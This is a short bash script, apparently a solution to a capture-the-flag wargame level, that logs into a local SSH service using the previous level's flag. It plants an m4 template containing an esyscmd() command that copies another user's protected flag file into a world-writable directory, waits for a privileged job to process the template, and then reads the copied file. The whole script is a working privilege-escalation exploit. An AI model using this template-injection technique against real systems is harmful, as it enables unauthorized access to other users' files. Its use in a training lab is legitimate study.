#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level04"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS=$(cat ../../level03/flag)
    echo -e "\nExploiting level04 ssh server ...\n\n\n"
    DEST=$(sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "find / -group babel 2> /dev/null | grep -v m4")
    echo -e "got dest var $DEST"
    COMMAND="esyscmd(cp /home/flag04/.flag $DEST/copy/ && chmod 777 $DEST/copy/.flag)"
    echo -e "got command var $COMMAND"
    sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "mkdir -p '$DEST'/copy && chmod 777 '$DEST'/copy && echo '$COMMAND' > $DEST/template.m4"
    sleep 31
    echo -e "\nGot a flag:"
    sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "cat $DEST/copy/.flag"
fi    
